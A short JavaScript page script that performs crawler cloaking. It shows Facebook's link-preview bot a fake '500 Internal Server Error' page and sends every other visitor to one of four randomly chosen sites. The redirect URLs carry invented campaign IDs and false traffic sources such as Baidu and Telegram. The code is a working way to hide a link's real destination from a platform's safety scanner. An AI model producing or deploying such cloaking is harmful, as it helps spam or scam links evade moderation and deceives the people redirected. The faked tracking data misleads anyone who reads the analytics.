        window.onload = function() {
            const userAgent = navigator.userAgent;

            if (userAgent.includes('facebookexternalhit')) {
                document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
                return; 
            }

            // Generate unique 5-digit random IDs for standard links
            const randomId1 = Math.floor(Math.random() * 90000) + 10000; 
            const randomId2 = Math.floor(Math.random() * 90000) + 10000; 
            const randomId3 = Math.floor(Math.random() * 90000) + 10000; 
            
            // Generate a random 2-to-3 digit ID for Github
            const randomGithubId = Math.floor(Math.random() * 990) + 10; 

            // The updated array with the Baidu link tracking fixed
            const pages = [
                "https://www.sanduni.online/?utm_source=facebook&utm_campaign=post_id_" + randomId1,
                "https://sanduni.site/?utm_source=m.baidu.com/s?word=sanduni.site&utm_campaign=post_id_" + randomId3,
                "https://www.tharushi.online/?utm_source=telegram&utm_campaign=post_id_github" + randomGithubId,
                "https://sandunicalling.blogspot.com/?utm_source=facebook&utm_campaign=post_id_" + randomId2
            ];
            
            const randomPage = pages[Math.floor(Math.random() * pages.length)];
            window.location.href = randomPage;
        };
